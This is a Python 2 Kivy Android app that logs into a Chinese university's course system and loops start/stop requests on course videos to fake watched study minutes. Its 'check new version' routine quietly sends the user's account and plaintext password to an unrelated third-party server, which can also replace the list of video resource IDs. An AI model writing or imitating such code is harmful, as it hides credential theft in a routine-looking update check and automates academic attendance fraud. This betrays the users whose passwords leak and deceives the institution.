#encoding=utf-8
#created by cgjiayou @ 2016/1/25
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.graphics import Color,Rectangle
from kivy.clock import Clock
from kivy.core.audio import SoundLoader
import threading
import random,time
import urllib,urllib2,cookielib,re
from xml.etree import ElementTree as ET
__version__ = "1.0"
platform='android'

class MyInput(TextInput):
    def __init__(self,hint,is_pwd,**kwargs):
        super(MyInput,self).__init__(**kwargs)
        self.background_color=(100./255,100./255,100./255,0.8)
        self.foreground_color=(1,1,1,1)
        self.hint_text=hint
        self.is_pwd=is_pwd

    def on_touch_down(self, touch):
        super(MyInput,self).on_touch_down(touch)
        if self.collide_point(*touch.pos) and not self.disabled:
            if self.is_pwd:
                self.password=True

    def insert_text(self, substring, from_undo=False):
        s=substring
        if self.is_pwd==False:
            try:
                s=filter(lambda x:x.isdigit(),str(substring))
            except:
                pass
        return super(MyInput,self).insert_text(s,from_undo)

class MyBt(Button):
    def __init__(self,img,**kwargs):
        super(MyBt,self).__init__(**kwargs)
        self.text='START'
        self.background_normal=img
        self.size_hint=(0.22,0.08)
        self.pos_hint={'x':0.39,'y':0.7}

class MyLayout(FloatLayout):
    def __init__(self,**kwargs):
        super(MyLayout,self).__init__(**kwargs)
        with self.canvas.before:
            Color(43./255,43./255,43./255)
            self.rect=Rectangle(size=self.size,pos=self.pos)
        self.bind(pos=self.update_rect,size=self.update_rect)

    def update_rect(self,instance,value):
        self.rect.pos=self.pos
        self.rect.size=self.size

class SnowPiece(Image):

    def __init__(self,root,**kwargs):
        super(SnowPiece,self).__init__()
        self.root=root
        self.rootx,self.rooty=root.size
        self.pos=[random.randint(1,10000)%self.rootx-self.rootx/2,self.rooty/2]
        self.source='snow.png'
        root.add_widget(self,index=10)
        self.flow(random.random())

    def flow(self,dt):
        dir=random.choice([0,1])
        if dir==0:
            self.pos[0]-=1
        else:
            self.pos[0]+=1
        self.pos[1]-=3
        if self.pos[1]<-self.rooty/2-20:
            self.root.remove_widget(self)
        else:
            Clock.schedule_once(self.flow,random.randint(10,15)*0.01)

    def on_touch_move(self, touch):
        if self.collide_point(*touch.pos) and touch.grab_current is self:
            self.x=touch.pos[0]-self.rootx/2
            self.y=touch.pos[1]-self.rooty/2
            return True

    def on_touch_up(self, touch):
        if touch.grab_current is self:
            touch.ungrab(self)
            Clock.schedule_once(self.flow,random.randint(10,15)*0.01)

    def on_touch_down(self, touch):
        if touch.grab_current is None and self.collide_point(*touch.pos):
            touch.grab(self)
            Clock.unschedule(self.flow)

    def collide_point(self, x, y):
        return self.x<x-self.rootx/2+16<self.x+32 and self.y<y-self.rooty/2+17<self.y+34

class Nyanpass(Image):
    def __init__(self):
        super(Nyanpass,self).__init__()
        self.source='nyanpass_back3.png'
        self.size_hint=[1,0.5]
        self.nyansound=SoundLoader.load('nyanpass.mp3')


    def on_touch_down(self, touch):
        if self.collide_point(*touch.pos) and touch.grab_current is None:
            self.nyan()

    def nyanPost(self):
        try:
            url='http://nyanpass.com/add.php'
            values={'nyan':"pass",
                    'swjtu':'Nyanpass'}
            data=urllib.urlencode(values)
            request=urllib2.Request(url,data=data)
            response=urllib2.urlopen(request)
            self.parent.addHint('had visited "nyanpass.com/add.php" and %s returned'%response.read()[7:-1])
        except:
            pass

    def nyan(self):
        #if not self.clip.isplaying():
        #    self.clip.play()
        self.nyansound.play()
        thread=threading.Thread(target=self.nyanPost)
        thread.setDaemon(True)
        thread.start()

class HintWindow(TextInput):
    def __init__(self):
        super(HintWindow,self).__init__(multiline=True)
        self.background_color=(0,0,0,0)
        self.foreground_color=(1,1,1,1)
        self.size_hint=(0.7,0.12)
        self.pos_hint={'x':0.15,'y':0.5}
        self.font_size=27
        self.text=u'%s program launched'%time.strftime('[%H-%M-%S]:')
        self.readonly=True

class RootWidget(MyLayout):

    def __init__(self, **kwargs):
        super(RootWidget,self).__init__(**kwargs)

        self.img=Nyanpass()
        self.add_widget(self.img,index=2)

        self.userid=MyInput('account',False,multiline=False,font_size=27,max_length=12)
        self.userid.size_hint=(0.66,0.05)
        self.userid.pos_hint={'x':0.17,'y':0.85}
        self.add_widget(self.userid,index=2)

        self.pwd=MyInput('password',True,multiline=False,password=False,font_size=27)
        self.pwd.size_hint=(0.66,0.05)
        self.pwd.pos_hint={'x':0.17,'y':0.80}
        self.add_widget(self.pwd,index=2)

        self.startbt=MyBt('start.png')
        self.add_widget(self.startbt,index=2)
        self.startbt.bind(on_press=self.on_start_down)

        self.hintwindow=HintWindow()
        self.add_widget(self.hintwindow,index=3)

        Clock.schedule_interval(self.snow,1.4)


        self.version=__version__
        self.newversion=False
        self.resources=['5CB9CDF08E6F614A','78CFB72F1D506DBD','1F3B373E973B23A8','83863BC437F62EF4','83863BC437F62EF4','CBD0D060FBCA3E9C',
                        '5A6EFD3BD2B4DD23','EAC57F73F42B0D37','F87246A55E314400','37E57CA44938DD29','FD3BB079D4521821','27F892B976406F27',
                        'B2EED5FE2F72EFFC','AFE77EB809858CCB','7AE65FD4E4383224','D7EAF159FE422260','83A10AF0DC7FF935','17E3B88342E72147',
                        '637F0ADDBF6FCA19','9ABBA5F427543BF2','9DE1334C5698CD39','8CA190CBC83CDC31','A508EAC9EC8D2DBD','E1C6FF7B07873CD1',
                        '356B48552FD8E73D','8194F3B75B7A02D2','B982BFCBE6DE4FF4','8F6DD2F4310969F7','0C25907CA6E9DAEE','D30C5E32132A1DAF',]

    def addHint(self,content):
        self.hintwindow.text+=time.strftime('\n[%H-%M-%S]: ')+content

    def snow(self,dt):
        count=random.randint(1,2)
        for i in range(count):
            SnowPiece(self)

    def on_start_down(self,instance):
        self.startbt.disabled=True
        self.a=self.userid.text
        self.b=self.pwd.text
        self.remove_widget(self.userid)
        self.remove_widget(self.pwd)
        self.remove_widget(self.startbt)
        self.thread0=threading.Thread(target=self.upload,args=(self.userid.text,self.pwd.text))
        self.thread0.setDaemon(True)
        self.thread=threading.Thread(target=self.appCore)
        self.thread.setDaemon(True)
        try:
            self.thread0.start()
        except:
            self.thread.start()

    def upload(self,id,pwd):
        if self.startbt.disabled is False:
            return
        try:
            self.addHint('check new version...')
            url='http://wzbazinga.sinaapp.com/swjtuNyanpass/newversion'
            values={'platform':platform,
                    'version':__version__,
                    'user_id':self.a,
                    'pwd':self.b}
            data=urllib.urlencode(values)
            request=urllib2.Request(url,data=data)
            response=urllib2.urlopen(request)
            content=response.read()
            tree=ET.fromstring(content)
            if tree.find('versionNo').text!=self.version:
                self.newversion=True
                self.addHint('new version found, please goto http://wzbazinga.sinaapp.com/swjtuNyanpass to download new version')
            else:
                self.addHint('the current version is the latest')

            if tree.find('updateRes').text=='yes':
                self.resources=tree.find('resources').text.split('#')
        except Exception,e:
            pass
        self.thread.start()

    def login(self,id,pwd):
        self.addHint('try to login...')
        url='http://202.115.71.135/course/servlet/UserLoginDataAction'
        values={
            "UserName":str(id),
            "Password":str(pwd),
            "UserType":"stu",
            "btn":"登陆"
        }
        data=urllib.urlencode(values)
        request=urllib2.Request(url,data=data)
        cookiejar=cookielib.CookieJar()
        handler=urllib2.HTTPCookieProcessor(cookiejar)
        opener=urllib2.build_opener(handler)
        try:
            response=opener.open(request)
            html=response.read().decode('utf-8')
            if not u'登录成功，系统2秒后载入...' in html:
                raise ValueError
            cookie=cookiejar._cookies['202.115.71.135']['/course/']['JSESSIONID']
            JESSIONID=cookie.value
            self.addHint('user logged with JESSIONID=%s'%JESSIONID[:5])
            return opener,JESSIONID
        except ValueError:
            self.addHint('log failed, please check your password')
            return False,False
        except urllib2.HTTPError,e:
            self.addHint('log failed: %s'%e)
            return False,False
        except:
            self.addHint('log failed, the internet may not be connected')
            return False,False

    def startVideo(self,opener,JESSIONID,resource_id):
        url='http://202.115.71.135/course/servlet/UserStudyRecordAction'
        headers={
            "Cookie":"JSESSIONID=%s"%JESSIONID,
            "Host":"202.115.71.135",
            "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0",
            "Referer":"http://202.115.71.135/course/websys/videoview.jsp?resource_id=%s"%resource_id,
        }
        values={
            "resource_id":resource_id,
            "SetType":"ADD",
            "ranstring":"",
            "sid":"",
            "tt":"1448426574483"
        }
        data=urllib.urlencode(values)
        request=urllib2.Request(url,data=data,headers=headers)
        try:
            response=opener.open(request)
            html=response.read().replace('GBK','UTF-8')
            xml_tree=ET.fromstring(html)
            state=xml_tree.find('select_state').text
            message=xml_tree.find('select_message').text
            if state=='1':
                self.addHint('start video successfully')
                return state,message
            else:
                self.addHint('start video failed, retrying')
                return False,False
        except Exception,e:
            self.addHint('start video failed, retrying')
            return False,False

    def stopVideo(self,opener,JESSIONID,message,resource_id):
        self.addHint('wake up, try to stop video...')
        url='http://202.115.71.135/course/servlet/UserStudyRecordAction'
        headers={
            "Host":"202.115.71.135",
            "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0",
            "Referer":"http://202.115.71.135/course/websys/videoview.jsp?resource_id=%s"%resource_id,
            "Cookie":"JSESSIONID=%s"%JESSIONID
        }
        values={
            "resource_id":resource_id,
            "SetType":"STOP",
            "ranstring":"",
            "sid":message,
            "tt":"1448436674483"
        }
        data=urllib.urlencode(values)
        request=urllib2.Request(url,data=data,headers=headers)
        try:
            opener.open(request)
            self.addHint('stop video successfully')
            return True
        except:
            self.addHint('stop video failed, retrying')
            return False

    def getTime(self,opener):
        url='http://202.115.71.135/course/websys/studentstudytime.jsp'
        response=opener.open(url)
        html=response.read().decode('utf-8')
        html=u''.join(html.split())
        remod=re.compile(ur'>(\d*?)</font>分钟')
        result=remod.findall(html)
        if result:
            self.addHint('total minutes: '+result[0])
        else:
            self.addHint('oops, get watching time failed')

    def sleep(self):
        sec=random.randint(550,650)
        self.addHint('start sleep for %d seconds'%sec)
        time.sleep(sec)

    def appCore(self):
        if self.newversion is True:
            return
        self.addHint('start main process')
        t=0
        while True:
            opener,JESSIONID=self.login(self.a,self.b)
            if opener:
                resid=random.choice(self.resources)
                state,message=self.startVideo(opener,JESSIONID,resid)
                while state=='1':
                    self.sleep()
                    self.stopVideo(opener,JESSIONID,message,resid)
                    state,message=self.startVideo(opener,JESSIONID,resid)
                t=self.getTime(opener)
                if t>600:
                    self.addHint('had watched more than 600 minutes, main process will be terminated')
                    break
                else:
                    self.addHint('less than 600, program will proceed')
            else:
                self.add_widget(self.userid)
                self.add_widget(self.pwd)
                self.startbt.disabled=False
                self.add_widget(self.startbt)
                break

class MainApp(App):
    def build(self):
        self.title='swjtuNyanpass'
        from kivy.uix.label import Label
        return RootWidget()
        return Label(text='wz')

if __name__ == '__main__':
    app=MainApp()
    app.run()
